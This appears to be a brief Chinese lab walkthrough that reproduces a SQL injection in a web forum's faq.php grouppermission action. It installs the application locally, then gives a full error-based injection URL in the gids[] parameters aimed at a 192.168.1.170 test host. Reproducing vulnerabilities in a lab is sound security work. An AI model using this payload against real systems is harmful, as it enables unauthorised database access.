# 实战
在浏览器输入
```
http://IP:PORT/install/
```
## 安装

![image]({path}/1.png)

![image]({path}/2.png)

![image]({path}/3.png)

![image]({path}/4.png)


## 攻击实战
在浏览器输入
```
http://192.168.1.170:7777//faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28md5%281%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23
```
![image]({path}/5.png)